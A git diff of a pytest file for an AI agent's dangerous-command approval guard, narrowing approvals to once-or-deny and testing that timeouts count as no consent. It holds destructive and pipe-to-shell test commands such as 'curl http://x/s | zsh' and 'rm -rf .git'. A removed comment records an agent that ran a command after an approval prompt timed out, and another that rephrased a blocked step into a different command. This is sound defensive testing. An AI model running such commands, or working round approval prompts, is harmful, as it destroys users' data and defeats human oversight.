@@ -11,11 +11,7 @@ import pytest
 
 import tools.approval as approval_module
 from tools import approval_context, approval_detection
-from tools import approval_smart
-from tools.approval import approve_session, detect_dangerous_command, detect_hardline_command, is_approved, load_permanent, prompt_dangerous_approval
-from tools.approval_context import _get_approval_mode
-from tools.approval_context import _normalize_approval_mode
-from tools.approval_smart import _smart_approve
+from tools.approval import detect_dangerous_command, detect_hardline_command, prompt_dangerous_approval
 
 
 class TestPackageManagerUninstallApproval:
@@ -37,58 +33,6 @@ class TestPackageManagerUninstallApproval:
     ])
     def test_install_and_update_stay_unprompted(self, command):
         assert detect_dangerous_command(command) == (False, None, None)
-
-
-class TestApprovalModeParsing:
-    def test_normalization_table(self):
-        # Unquoted YAML `off`/`on` arrive as booleans; unknown/empty fall back
-        # to the safe manual mode.
-        assert _normalize_approval_mode(False) == "off"
-        assert _normalize_approval_mode("off") == "off"
-        assert _normalize_approval_mode("  SMART  ") == "smart"
-        assert _normalize_approval_mode(True) == "manual"
-        assert _normalize_approval_mode("") == "manual"
-        assert _normalize_approval_mode("auto") == "manual"
-
-
-    def test_config_bool_false_maps_to_off(self):
-        with mock_patch("hermes_cli.config.load_config_readonly", return_value={"approvals": {"mode": False}}):
-            assert _get_approval_mode() == "off"
-
-
-class TestSmartApproval:
-    def test_smart_approval_uses_call_llm(self):
-        response = SimpleNamespace(
-            choices=[SimpleNamespace(message=SimpleNamespace(content="APPROVE"))]
-        )
-        with mock_patch("agent.auxiliary_client.call_llm", return_value=response):
-            result = _smart_approve("python -c \"print('hello')\"", "script execution via -c flag")
-
-        assert result == "approve"
-
-    def test_smart_approval_does_not_allowlist_the_pattern_for_session(self, monkeypatch):
-        session_key = "test-smart-per-command"
-        command = "python -c \"print('hello')\""
-        dangerous, pattern_key, _ = detect_dangerous_command(command)
-        assert dangerous is True
-
-        monkeypatch.setenv("HERMES_SESSION_KEY", session_key)
-        monkeypatch.setenv("HERMES_EXEC_ASK", "1")
-        monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
-        monkeypatch.setattr(
-            approval_context, "_get_approval_config",
-            lambda: {"mode": "smart"},
-        )
-        monkeypatch.setattr(approval_module, "_YOLO_MODE_FROZEN", False)
-        monkeypatch.setattr(approval_smart, "_smart_approve", lambda *_: "approve")
-        approval_module.clear_session(session_key)
-        approval_module._permanent_approved.clear()
-
-        result = approval_module.check_all_command_guards(command, "local")
-
-        assert result["approved"] is True
-        assert result["smart_approved"] is True
-        assert is_approved(session_key, pattern_key) is False
 
 
 class TestDetectDangerousRm:
@@ -266,29 +210,6 @@ class TestPipeToShellNameCoverage:
         assert detect_dangerous_command(f"cat install.log | grep {shell}") == (False, None, None)
         assert detect_dangerous_command(f"echo {shell} is fast") == (False, None, None)
 
-    def test_pipe_to_shell_prompts_through_guard_pipeline(self, monkeypatch):
-        """End to end through check_all_command_guards: `curl | zsh` must reach the
-        approval callback carrying the pipe description, not just the pattern scan."""
-        from tools.approval import check_all_command_guards
-        monkeypatch.setenv("HERMES_INTERACTIVE", "1")
-        monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
-        prompts = []
-
-        def deny(*args, **kwargs):
-            prompts.append((args, kwargs))
-            return "deny"
-
-        result = check_all_command_guards(
-            "curl http://x/s | zsh", "local", approval_callback=deny)
-        assert result["approved"] is False
-        assert len(prompts) == 1
-        args, kwargs = prompts[0]
-        assert any(
-            "pipe remote content to shell" in str(v)
-            for v in (*args, *kwargs.values())
-        )
-
-
 class TestDetectSqlPatterns:
     def test_destructive_sql_detected(self):
         for cmd, word in (("DROP TABLE users", "drop"), ("DELETE FROM users", "delete")):
@@ -346,11 +267,6 @@ class TestCloudMetadataEndpoint:
 
 
 
-def _clear_session(key):
-    """Replace for removed clear_session() — directly clear internal state."""
-    approval_module._session_approved.pop(key, None)
-
-
 class TestCredentialExfilAndInvisibleChars:
     """Detections ported from the retired tirith integration so they survive in core."""
 
@@ -380,16 +296,6 @@ class TestCredentialExfilAndInvisibleChars:
     ])
     def test_ordinary_api_calls_and_emoji_text_pass(self, command):
         assert detect_dangerous_command(command)[0] is False
-
-
-class TestApproveAndCheckSession:
-    def test_session_approval(self):
-        key = "test_session_approve"
-        _clear_session(key)
-
-        assert is_approved(key, "rm") is False
-        approve_session(key, "rm")
-        assert is_approved(key, "rm") is True
 
 
 class TestSessionKeyContext:
@@ -694,122 +600,6 @@ class TestProjectSensitiveTeePattern:
         assert "project env/config" in desc.lower()
 
 
-class TestPatternKeyUniqueness:
-    """Bug: pattern_key is derived by splitting on \\b and taking [1], so
-    patterns starting with the same word (e.g. find -exec rm and find -delete)
-    produce the same key. Approving one silently approves the other."""
-
-    def test_approving_find_exec_does_not_approve_find_delete(self):
-        """Session approval for find -exec rm must not carry over to find -delete."""
-        _, key_exec, _ = detect_dangerous_command("find . -exec rm {} \\;")
-        _, key_delete, _ = detect_dangerous_command("find . -name '*.tmp' -delete")
-        assert key_exec != key_delete, (
-            f"find -exec rm and find -delete share key {key_exec!r} — "
-            "approving one silently approves the other"
-        )
-        session = "test_find_collision"
-        _clear_session(session)
-        approve_session(session, key_exec)
-        assert is_approved(session, key_exec) is True
-        assert is_approved(session, key_delete) is False, (
-            "approving find -exec rm should not auto-approve find -delete"
-        )
-        _clear_session(session)
-
-    def test_legacy_find_key_still_approves_both_variants(self):
-        """Old colliding allowlist entry 'find' should remain backwards compatible."""
-        _, key_exec, _ = detect_dangerous_command("find . -exec rm {} \\;")
-        _, key_delete, _ = detect_dangerous_command("find . -name '*.tmp' -delete")
-        with mock_patch.object(approval_module, "_permanent_approved", set()):
-            load_permanent({"find"})
-            assert is_approved("legacy-find", key_exec) is True
-            assert is_approved("legacy-find", key_delete) is True
-
-
-class TestPermanentAllowlistReload:
-    def test_load_permanent_replaces_stale_entries(self):
-        with mock_patch.object(approval_module, "_permanent_approved", set()):
-            load_permanent({"old-pattern"})
-            assert is_approved("reload", "old-pattern") is True
-
-            load_permanent({"new-pattern"})
-
-            assert is_approved("reload", "old-pattern") is False
-            assert is_approved("reload", "new-pattern") is True
-
-    def test_load_permanent_allowlist_clears_when_config_is_empty(self):
-        with mock_patch.object(approval_module, "_permanent_approved", {"stale-pattern"}):
-            with mock_patch("hermes_cli.config.load_config_readonly", return_value={"command_allowlist": []}):
-                assert approval_module.load_permanent_allowlist() == set()
-
-            assert approval_module._permanent_approved == set()
-            assert is_approved("reload", "stale-pattern") is False
-
-
-class TestFullCommandAlwaysShown:
-    """The full command is always shown in the approval prompt (no truncation).
-
-    Previously there was a [v]iew full option for long commands. Now the full
-    command is always displayed. These tests verify the basic approval flow
-    still works with long commands, and that the retired 'v' key falls through
-    to deny. (#1553)
-    """
-
-    def test_choice_with_long_command(self):
-        long_cmd = "rm -rf " + "a" * 200
-        for keystroke, expected in (
-            ("o", "once"), ("s", "session"), ("a", "always"), ("d", "deny"), ("v", "deny"),
-        ):
-            with mock_patch("builtins.input", return_value=keystroke):
-                result = prompt_dangerous_approval(long_cmd, "recursive delete")
-            assert result == expected, keystroke
-
-
-class TestSmartDeniedPrompt:
-    def test_callback_receives_smart_denied_capability(self):
-        captured = {}
-
-        def callback(command, description, **kwargs):
-            captured.update(kwargs)
-            return "deny"
-
-        result = prompt_dangerous_approval(
-            "rm -rf /tmp/example",
-            "recursive delete",
-            allow_permanent=False,
-            smart_denied=True,
-            approval_callback=callback,
-        )
-
-        assert result == "deny"
-        assert captured == {"allow_permanent": False, "smart_denied": True}
-
-    def test_short_prompt_smart_deny_rejects_session_input(self):
-        with mock_patch("builtins.input", return_value="session"):
-            result = prompt_dangerous_approval(
-                "rm -rf /tmp/example",
-                "recursive delete",
-                allow_permanent=False,
-                smart_denied=True,
-            )
-
-        assert result == "deny"
-
-    def test_smart_deny_offers_only_once_and_deny(self, capsys):
-        with mock_patch("builtins.input", return_value="deny"):
-            prompt_dangerous_approval(
-                "rm -rf /tmp/example",
-                "recursive delete",
-                allow_permanent=False,
-                smart_denied=True,
-            )
-
-        rendered = capsys.readouterr().out
-        assert "[o]nce" in rendered and "[d]eny" in rendered
-        assert "[s]ession" not in rendered and "[a]lways" not in rendered
-
-
-
 class TestForkBombDetection:
     """The fork bomb regex must match the classic :(){ :|:& };: pattern."""
 
@@ -920,14 +710,6 @@ class TestWebhookApprovalExclusion:
 
         assert _is_gateway_approval_context() is False
 
-    def _isolate(self, monkeypatch):
-        """Neutralize host leakage: yolo frozen at import time + real config."""
-        import tools.approval as approval_mod
-        from tools import approval_context
-
-        monkeypatch.setattr(approval_mod, "_YOLO_MODE_FROZEN", False)
-        monkeypatch.setattr(approval_context, "_get_approval_mode", lambda: "smart")
-
     def test_webhook_dangerous_command_denies_by_default(self, monkeypatch):
         """Webhook sessions that trigger dangerous commands DENY instantly.
 
@@ -938,7 +720,6 @@ class TestWebhookApprovalExclusion:
         """
         from tools.approval import check_all_command_guards
 
-        self._isolate(monkeypatch)
         monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
         monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
         monkeypatch.delenv("HERMES_INTERACTIVE", raising=False)
@@ -954,7 +735,6 @@ class TestWebhookApprovalExclusion:
         """approvals.unattended_mode: approve restores the old auto-approve path."""
         from tools.approval import check_all_command_guards
 
-        self._isolate(monkeypatch)
         monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
         monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
         monkeypatch.delenv("HERMES_INTERACTIVE", raising=False)
@@ -984,7 +764,6 @@ class TestWebhookApprovalExclusion:
         """api_server sessions get the same instant deny (#87509)."""
         from tools.approval import check_all_command_guards
 
-        self._isolate(monkeypatch)
         monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
         monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
         monkeypatch.delenv("HERMES_INTERACTIVE", raising=False)
@@ -999,7 +778,6 @@ class TestWebhookApprovalExclusion:
         """execute_code is denied instantly on unattended platforms (parity with cron)."""
         from tools.approval import check_execute_code_guard
 
-        self._isolate(monkeypatch)
         monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
         monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
         monkeypatch.delenv("HERMES_INTERACTIVE", raising=False)
@@ -1511,273 +1289,11 @@ class TestEtcPatternsUnaffectedByRefactor:
 
 
 # =========================================================================
-# Gateway approval timeout = deny, NOT consent (#24912)
-#
-# A Slack user walked away mid-conversation; the agent requested approval
-# to run `rm -rf .git`; the prompt timed out; the agent ran the command
-# anyway. Reported by @tofalck on 2026-05-13, corroborated by
-# @angry-programmer on Telegram. Silence is not consent.
-#
-# These tests pin:
-#   1. Gateway timeout → approved=False, with a message strong enough that
-#      a downstream agent reading "BLOCKED: ... Silence is not consent."
-#      treats it as a hard halt, not an invitation to rephrase.
-#   2. The structured outcome / user_consent fields are present so
-#      plugins, hooks, and audit pipelines can act on the timeout without
-#      string-parsing the message.
-#   3. Explicit /deny carries the same shape (treat-as-not-consented).
-# =========================================================================
-
-
-class TestApprovalTimeoutIsNotConsent:
-    """The gateway approval contract: silence is not consent (#24912)."""
-
-    SESSION_KEY = "test-no-consent-session"
-
-    def setup_method(self):
-        """Reset module state and force a tight approval timeout for fast tests."""
-        from tools import approval as mod
-        mod._gateway_queues.clear()
-        mod._gateway_notify_cbs.clear()
-        mod._session_approved.clear()
-        mod._permanent_approved.clear()
-
-        self._saved_env = {
-            k: os.environ.get(k)
-            for k in ("HERMES_GATEWAY_SESSION", "HERMES_CRON_SESSION",
-                      "HERMES_YOLO_MODE",
-                      "HERMES_SESSION_KEY", "HERMES_INTERACTIVE")
-        }
-        os.environ.pop("HERMES_YOLO_MODE", None)
-        os.environ.pop("HERMES_INTERACTIVE", None)
-        # HERMES_CRON_SESSION takes priority over HERMES_GATEWAY_SESSION in
-        # _is_gateway_approval_context(); a leaked value from a parent cron
-        # process would force the cron path and break these gateway tests.
-        os.environ.pop("HERMES_CRON_SESSION", None)
-        os.environ["HERMES_GATEWAY_SESSION"] = "1"
-        os.environ["HERMES_SESSION_KEY"] = self.SESSION_KEY
-
-    def teardown_method(self):
-        from tools import approval as mod
-        mod._gateway_queues.clear()
-        mod._gateway_notify_cbs.clear()
-        for k, v in self._saved_env.items():
-            if v is None:
-                os.environ.pop(k, None)
-            else:
-                os.environ[k] = v
-
-    def _force_short_timeout(self, monkeypatch, seconds=0.05):
-        monkeypatch.setattr(
-            approval_context, "_get_approval_config",
-            lambda: {"mode": "manual", "timeout": seconds},
-        )
-
-    def test_timeout_blocks_with_no_consent_and_timeout_hook(self, monkeypatch):
-        """The reported #24912 scenario — user never responds, agent must see
-        BLOCKED, and the post hook must distinguish timeout from deny so audit
-        plugins can alert on 'agent asked, user never replied'."""
-        from tools import approval as mod
-
-        self._force_short_timeout(monkeypatch)
-
-        # Slack-shaped: notify_cb registered, but user doesn't respond.
-        notified = []
-        mod.register_gateway_notify(self.SESSION_KEY, lambda data: notified.append(data))
-
-        hook_calls = []
-        original_fire = approval_context._fire_approval_hook
-
-        def _capture(event_name, **kwargs):
-            hook_calls.append((event_name, kwargs))
-            return original_fire(event_name, **kwargs)
-
-        monkeypatch.setattr(approval_context, "_fire_approval_hook", _capture)
-
-        result = mod.check_all_command_guards("rm -rf .git", "local")
-
-        assert result["approved"] is False
-        assert result.get("user_consent") is False
-        assert result.get("outcome") == "timeout"
-        # The notify_cb DID fire — we did try to ask the user.
-        assert len(notified) == 1
-
-        # The BLOCKED message must explicitly tell the agent not to rephrase;
-        # without it the agent treats "Do NOT retry this command" as permission
-        # to try a different command achieving the same outcome.
-        msg = result["message"]
-        assert "BLOCKED" in msg
-        assert "NOT consented" in msg
-        assert "Silence is not consent" in msg
-        assert "retry" in msg.lower()
-        assert "rephrase" in msg.lower()
-        assert "different command" in msg.lower()
-
-        posts = [c for c in hook_calls if c[0] == "post_approval_response"]
-        assert posts, "post_approval_response hook did not fire"
-        assert posts[-1][1].get("choice") == "timeout", (
-            f"hook choice should be 'timeout' on no-response, got {posts[-1][1].get('choice')!r}"
-        )
-
-    def test_explicit_deny_carries_same_no_consent_shape(self, monkeypatch):
-        """An explicit /deny must produce the same shape as timeout —
-        the agent should treat both identically."""
-        from tools import approval as mod
-
-        self._force_short_timeout(monkeypatch, seconds=60)
-
-        notified = []
-        mod.register_gateway_notify(self.SESSION_KEY, lambda data: notified.append(data))
-
-        # Spawn the approval wait in a thread, then resolve it with "deny".
-        result_holder = {}
-        def _check():
-            result_holder["r"] = mod.check_all_command_guards("rm -rf .git", "local")
-        t = threading.Thread(target=_check)
-        t.start()
-
-        # Wait for the queue entry to appear, then resolve.
-        for _ in range(200):
-            if mod._gateway_queues.get(self.SESSION_KEY):
-                break
-            time.sleep(0.005)
-        mod.resolve_gateway_approval(self.SESSION_KEY, "deny")
-        t.join(timeout=5)
-        assert "r" in result_holder, "approval wait did not return after deny"
-
-        r = result_holder["r"]
-        assert r["approved"] is False
-        assert r.get("user_consent") is False
-        assert r.get("outcome") == "denied"
-        assert "Silence is not consent" not in r["message"]  # this one IS denied, not timed-out
-        assert "NOT consented" in r["message"]
-        assert "rephrase" in r["message"].lower()
-
-    def test_timeout_emits_post_hook_with_timeout_outcome(self, monkeypatch):
-        """Plugins must be able to distinguish timeout from explicit deny.
-
-        This is what an audit / notification plugin needs to alert
-        operators on 'agent asked, user never replied' incidents like #24912.
-        """
-        from tools import approval as mod
-        self._force_short_timeout(monkeypatch, seconds=1)
-        mod.register_gateway_notify(self.SESSION_KEY, lambda data: None)
-
-        hook_calls = []
-        original_fire = approval_context._fire_approval_hook
-
-        def _capture(event_name, **kwargs):
-            hook_calls.append((event_name, kwargs))
-            return original_fire(event_name, **kwargs)
-
-        monkeypatch.setattr(approval_context, "_fire_approval_hook", _capture)
-
-        mod.check_all_command_guards("rm -rf .git", "local")
-
-        # post_approval_response must be in the hook log with choice=timeout
-        posts = [c for c in hook_calls if c[0] == "post_approval_response"]
-        assert posts, "post_approval_response hook did not fire"
-        last_post = posts[-1][1]
-        assert last_post.get("choice") == "timeout", (
-            f"hook choice should be 'timeout' on no-response, got {last_post.get('choice')!r}"
-        )
-
-    def test_notify_failure_emits_post_hook_and_cleans_up(self, monkeypatch):
-        """A failed notification still terminates the approval lifecycle."""
-        from tools import approval as mod
-
-        hook_calls = []
-
-        def _capture(event_name, **kwargs):
-            hook_calls.append((event_name, kwargs))
-
-        monkeypatch.setattr(approval_context, "_fire_approval_hook", _capture)
-
-        def _fail_notify(_data):
-            raise RuntimeError("private gateway failure")
-
-        decision = mod._await_gateway_decision(
-            self.SESSION_KEY,
-            _fail_notify,
-            {
-                "command": "redacted-command",
-                "description": "redacted-description",
-                "pattern_key": "dangerous",
-                "pattern_keys": ["dangerous"],
-            },
-        )
-
-        assert decision == {
-            "resolved": False,
-            "choice": None,
-            "notify_failed": True,
-        }
-        assert self.SESSION_KEY not in mod._gateway_queues
-        assert [name for name, _ in hook_calls] == [
-            "pre_approval_request",
-            "post_approval_response",
-        ]
-        assert hook_calls[-1][1]["choice"] == "notify_failed"
-
-    def test_pending_approval_is_replayable_and_acknowledged(self, monkeypatch):
-        from tools import approval as mod
-
-        self._force_short_timeout(monkeypatch, seconds=2)
-        notified = []
-
-        def notify(data):
-            # The real queue entry is already pending here. Inspect/respond at
-            # publication, without racing thread startup or the approval deadline.
-            notified.append(data)
-            request_id = data["request_id"]
-            assert request_id
-            assert mod.list_gateway_approvals(self.SESSION_KEY) == [data]
-            assert mod.ack_gateway_approval(self.SESSION_KEY, request_id) is True
-            assert mod.list_gateway_approvals(self.SESSION_KEY) == [data]
-            assert mod.resolve_gateway_approval(
-                self.SESSION_KEY, "once", request_id=request_id
-            ) == 1
-
-        mod.register_gateway_notify(self.SESSION_KEY, notify)
-        result = mod.check_all_command_guards("rm -rf .git", "local")
-
-        assert len(notified) == 1
-        assert result["approved"] is True
-        assert mod.list_gateway_approvals(self.SESSION_KEY) == []
-
-    def test_stale_request_id_cannot_resolve_current_approval(self, monkeypatch):
-        from tools import approval as mod
-
-        self._force_short_timeout(monkeypatch, seconds=2)
-        notified = []
-
-        def notify(data):
-            notified.append(data)
-            assert mod.resolve_gateway_approval(
-                self.SESSION_KEY, "once", request_id="stale-request"
-            ) == 0
-            assert mod.list_gateway_approvals(self.SESSION_KEY) == [data]
-            assert mod.resolve_gateway_approval(
-                self.SESSION_KEY, "deny", request_id=data["request_id"]
-            ) == 1
-
-        mod.register_gateway_notify(self.SESSION_KEY, notify)
-        result = mod.check_all_command_guards("rm -rf .git", "local")
-
-        assert len(notified) == 1
-        assert result["approved"] is False
-        assert result["user_consent"] is False
-        # Callback assertions are caught as notify_failed; require the actual denial.
-        assert result["outcome"] == "denied"
-        assert mod.list_gateway_approvals(self.SESSION_KEY) == []
-
-
-# =========================================================================
 # Coalesce identical concurrent approvals — one prompt, one answer.
 # Port of anomalyco/opencode#40869 (deduplicate websearch consent prompts):
-# parallel tool calls hitting the same dangerous-command gate must produce
-# ONE user-facing prompt; followers adopt the leader's session/always/deny
-# decision, while a single-use "once" makes the follower re-prompt.
+# parallel waits on the same owner decision must produce ONE user-facing
+# prompt; followers adopt the leader's deny, while a single-use "once" makes
+# the follower re-prompt.
 # =========================================================================
 
 
@@ -1788,8 +1304,6 @@ class TestConcurrentApprovalCoalescing:
         from tools import approval as mod
         mod._gateway_queues.clear()
         mod._gateway_notify_cbs.clear()
-        mod._session_approved.clear()
-        mod._permanent_approved.clear()
 
     teardown_method = setup_method
 
@@ -1841,11 +1355,11 @@ class TestConcurrentApprovalCoalescing:
         assert len(notified) == 1
 
         # One answer resolves everyone.
-        assert mod.resolve_gateway_approval(self.SESSION_KEY, "session") == 1
+        assert mod.resolve_gateway_approval(self.SESSION_KEY, "deny") == 1
         for t in threads:
             t.join(timeout=5)
         for r in results:
-            assert r is not None and r["resolved"] and r["choice"] == "session"
+            assert r is not None and r["resolved"] and r["choice"] == "deny"
         # Followers are marked as coalesced adoptions.
         assert sum(1 for r in results if r.get("coalesced")) == 2
 
@@ -1921,10 +1435,10 @@ class TestConcurrentApprovalCoalescing:
         # Two distinct prompts, two queue entries, two resolutions needed.
         assert len(notified) == 2
         assert len(mod._gateway_queues.get(self.SESSION_KEY, [])) == 2
-        mod.resolve_gateway_approval(self.SESSION_KEY, "session", resolve_all=True)
+        mod.resolve_gateway_approval(self.SESSION_KEY, "once", resolve_all=True)
         t1.join(timeout=5)
         t2.join(timeout=5)
-        assert all(r is not None and r["choice"] == "session" for r in results)
+        assert all(r is not None and r["choice"] == "once" for r in results)
 
 class TestApprovalPromptRedaction:
     """Secrets are masked in user-facing approval surfaces (#13139).
@@ -1951,7 +1465,7 @@ class TestApprovalPromptRedaction:
         """prompt_dangerous_approval hands the callback a masked command."""
         seen = {}
 
-        def cb(command, description, *, allow_permanent=True):
+        def cb(command, description, **kwargs):
             seen["command"] = command
             seen["description"] = description
             return "deny"
@@ -1971,7 +1485,7 @@ class TestApprovalPromptRedaction:
         """A command with no secret is shown verbatim -- no over-redaction."""
         seen = {}
 
-        def cb(command, description, *, allow_permanent=True):
+        def cb(command, description, **kwargs):
             seen["command"] = command
             return "deny"
 
@@ -1979,134 +1493,223 @@ class TestApprovalPromptRedaction:
                                   approval_callback=cb)
         assert seen["command"] == "rm -rf /var/data"
 
-    def test_execute_code_pending_fallback_redacts_script(self):
-        """check_execute_code_guard's no-notifier fallback masks an embedded
-        secret in both the pending record and the returned approval message."""
-        from unittest.mock import patch as _patch
 
-        from tools.approval import check_execute_code_guard
+class TestOnceOrDenyPrompt:
+    """The CLI prompt offers one operation at a time: once or deny."""
 
-        code = (
-            "import os\n"
-            'api_key = "sk-proj-abc123xyz4567890abcdef"\n'
-            "print(api_key)"
+    def test_choices(self):
+        for keystroke, expected in (("o", "once"), ("d", "deny"), ("s", "deny"), ("a", "deny"), ("v", "deny")):
+            with mock_patch("builtins.input", return_value=keystroke):
+                assert prompt_dangerous_approval("rm -rf " + "a" * 200, "recursive delete") == expected, keystroke
+
+    def test_callback_is_told_no_wider_scope_is_offered(self):
+        captured = {}
+
+        def callback(command, description, **kwargs):
+            captured.update(kwargs)
+            return "deny"
+
+        assert prompt_dangerous_approval("rm -rf /tmp/example", "recursive delete", approval_callback=callback) == "deny"
+        assert captured == {"allow_permanent": False, "allow_session": False}
+
+    def test_menu_shows_only_once_and_deny(self, capsys):
+        with mock_patch("builtins.input", return_value="deny"):
+            prompt_dangerous_approval("rm -rf /tmp/example", "recursive delete")
+        rendered = capsys.readouterr().out
+        assert "[o]nce" in rendered and "[d]eny" in rendered
+        assert "[s]ession" not in rendered and "[a]lways" not in rendered
+
+
+class TestOwnerDecisionIsNotConsentOnSilence:
+    """A held draft's owner wait: silence is not consent, deny is a hard halt (#24912)."""
+
+    SESSION_KEY = "test-no-consent-session"
+
+    @pytest.fixture(autouse=True)
+    def _gateway_session(self, monkeypatch):
+        from tools import approval as mod
+        mod._gateway_queues.clear()
+        mod._gateway_notify_cbs.clear()
+        for var in ("HERMES_CRON_SESSION", "HERMES_INTERACTIVE", "HERMES_SESSION_PLATFORM"):
+            monkeypatch.delenv(var, raising=False)
+        monkeypatch.setenv("HERMES_GATEWAY_SESSION", "1")
+        monkeypatch.setenv("HERMES_SESSION_KEY", self.SESSION_KEY)
+        monkeypatch.setattr("tools.details_bubble.post_details", lambda *a, **k: None)
+        yield
+        mod._gateway_queues.clear()
+        mod._gateway_notify_cbs.clear()
+
+    def _short_timeout(self, monkeypatch, seconds):
+        monkeypatch.setattr(approval_context, "_get_approval_config", lambda: {"timeout": seconds})
+
+    @staticmethod
+    def _ask(mod, **kwargs):
+        return mod.request_draft_approval(
+            text="Hello there", description="Send a message", pattern_key="draft:test", draft={"kind": "message"},
+            **kwargs)
+
+    def test_timeout_blocks_with_no_consent_and_timeout_hook(self, monkeypatch):
+        from tools import approval as mod
+        self._short_timeout(monkeypatch, 0.05)
+        notified = []
+        mod.register_gateway_notify(self.SESSION_KEY, notified.append)
+        hook_calls = []
+        original_fire = approval_context._fire_approval_hook
+
+        def _capture(event_name, **kwargs):
+            hook_calls.append((event_name, kwargs))
+            return original_fire(event_name, **kwargs)
+
+        monkeypatch.setattr(approval_context, "_fire_approval_hook", _capture)
+
+        result = self._ask(mod)
+
+        assert result["approved"] is False
+        assert result.get("user_consent") is False
+        assert result.get("outcome") == "timeout"
+        assert len(notified) == 1
+        assert notified[0]["choices"] == ["once", "deny"]
+        assert "allow_session" not in notified[0] and "allow_permanent" not in notified[0]
+        msg = result["message"]
+        assert "BLOCKED" in msg and "Silence is not consent" in msg and "NOT sent" in msg
+        assert "retry" in msg.lower() and "rephrase" in msg.lower()
+        posts = [c for c in hook_calls if c[0] == "post_approval_response"]
+        assert posts and posts[-1][1].get("choice") == "timeout"
+
+    def test_explicit_deny_carries_same_no_consent_shape(self, monkeypatch):
+        from tools import approval as mod
+        self._short_timeout(monkeypatch, 60)
+        mod.register_gateway_notify(self.SESSION_KEY, lambda data: None)
+        holder = {}
+        t = threading.Thread(target=lambda: holder.update(r=self._ask(mod)))
+        t.start()
+        for _ in range(200):
+            if mod._gateway_queues.get(self.SESSION_KEY):
+                break
+            time.sleep(0.005)
+        mod.resolve_gateway_approval(self.SESSION_KEY, "deny")
+        t.join(timeout=5)
+        r = holder["r"]
+        assert r["approved"] is False and r.get("user_consent") is False and r.get("outcome") == "denied"
+        assert "Silence is not consent" not in r["message"]
+        assert "NOT sent" in r["message"]
+
+    def test_notify_failure_emits_post_hook_and_cleans_up(self, monkeypatch):
+        from tools import approval as mod
+        hook_calls = []
+        monkeypatch.setattr(approval_context, "_fire_approval_hook", lambda name, **kw: hook_calls.append((name, kw)))
+
+        def _fail_notify(_data):
+            raise RuntimeError("private gateway failure")
+
+        decision = mod._await_gateway_decision(
+            self.SESSION_KEY, _fail_notify,
+            {"command": "redacted-command", "description": "redacted-description",
+             "pattern_key": "dangerous", "pattern_keys": ["dangerous"]},
         )
-        cfg = {"approvals": {"mode": "manual"}}
-        with _patch("hermes_cli.config.load_config_readonly", return_value=cfg):
-            with _patch("tools.approval._is_gateway_approval_context",
-                        return_value=True):
-                with _patch("tools.approval_context._get_approval_mode",
-                            return_value="manual"):
-                    # No gateway notify callback registered -> pending fallback.
-                    result = check_execute_code_guard(code, "local")
 
-        assert result.get("status") == "pending_approval"
-        # The script's credential must not appear in the user-facing message.
-        assert "sk-proj-abc123xyz4567890abcdef" not in result["message"]
-        assert "sk-proj-abc123xyz4567890abcdef" not in result["command"]
+        assert decision == {"resolved": False, "choice": None, "notify_failed": True}
+        assert self.SESSION_KEY not in mod._gateway_queues
+        assert [name for name, _ in hook_calls] == ["pre_approval_request", "post_approval_response"]
+        assert hook_calls[-1][1]["choice"] == "notify_failed"
+
+    def test_pending_approval_is_replayable_and_acknowledged(self, monkeypatch):
+        from tools import approval as mod
+        self._short_timeout(monkeypatch, 2)
+        notified = []
+
+        def notify(data):
+            notified.append(data)
+            request_id = data["request_id"]
+            assert mod.list_gateway_approvals(self.SESSION_KEY) == [data]
+            assert mod.ack_gateway_approval(self.SESSION_KEY, request_id) is True
+            assert mod.resolve_gateway_approval(self.SESSION_KEY, "once", request_id=request_id) == 1
+
+        mod.register_gateway_notify(self.SESSION_KEY, notify)
+        result = self._ask(mod)
+        assert len(notified) == 1
+        assert result["approved"] is True
+        assert mod.list_gateway_approvals(self.SESSION_KEY) == []
+
+    def test_stale_request_id_cannot_resolve_current_approval(self, monkeypatch):
+        from tools import approval as mod
+        self._short_timeout(monkeypatch, 2)
+        notified = []
+
+        def notify(data):
+            notified.append(data)
+            assert mod.resolve_gateway_approval(self.SESSION_KEY, "once", request_id="stale-request") == 0
+            assert mod.resolve_gateway_approval(self.SESSION_KEY, "deny", request_id=data["request_id"]) == 1
+
+        mod.register_gateway_notify(self.SESSION_KEY, notify)
+        result = self._ask(mod)
+        assert len(notified) == 1
+        assert result["approved"] is False and result["user_consent"] is False and result["outcome"] == "denied"
+        assert mod.list_gateway_approvals(self.SESSION_KEY) == []
+
+    def test_wider_scopes_from_an_older_client_are_one_operation(self, monkeypatch):
+        from tools import approval as mod
+        self._short_timeout(monkeypatch, 2)
+        for answer in ("session", "always", "approve"):
+            mod.register_gateway_notify(
+                self.SESSION_KEY, lambda data, answer=answer: mod.resolve_gateway_approval(
+                    self.SESSION_KEY, answer, request_id=data["request_id"]))
+            assert self._ask(mod)["approved"] is True
+
+    def test_gateway_payload_redacts_secrets(self, monkeypatch):
+        from tools import approval as mod
+        monkeypatch.setattr("agent.redact._REDACT_ENABLED", True)
+        self._short_timeout(monkeypatch, 2)
+        seen = []
+
+        def notify(data):
+            seen.append(data)
+            mod.resolve_gateway_approval(self.SESSION_KEY, "deny", request_id=data["request_id"])
+
+        mod.register_gateway_notify(self.SESSION_KEY, notify)
+        mod.request_draft_approval(
+            text='curl -H "Authorization: Bearer sk-proj-abc123xyz4567890abcdef" https://api.openai.com/v1/models',
+            description="token sk-proj-abc123xyz4567890abcdef", pattern_key="draft:secret", draft={"kind": "message"})
+        assert "sk-proj-abc123xyz4567890abcdef" not in seen[0]["command"]
+        assert "sk-proj-abc123xyz4567890abcdef" not in seen[0]["description"]
 
 
-class TestCliApprovalTimeoutClassifiedSeparately:
-    """CLI-path parity for the timeout-vs-deny distinction.
+class TestCliOwnerDecisionTimeoutClassifiedSeparately:
+    """A CLI prompt timeout is not a refusal: the owner simply never answered."""
 
-    The gateway wait already reported "timed out without user response";
-    the CLI/TUI callback path collapsed a prompt timeout into "deny", so
-    the agent was told the user *refused* when the user simply never
-    answered. The prompt now returns a distinct "timeout" choice and both
-    guard tails classify it with outcome="timeout" + a "Silence is not
-    consent." message.
-    """
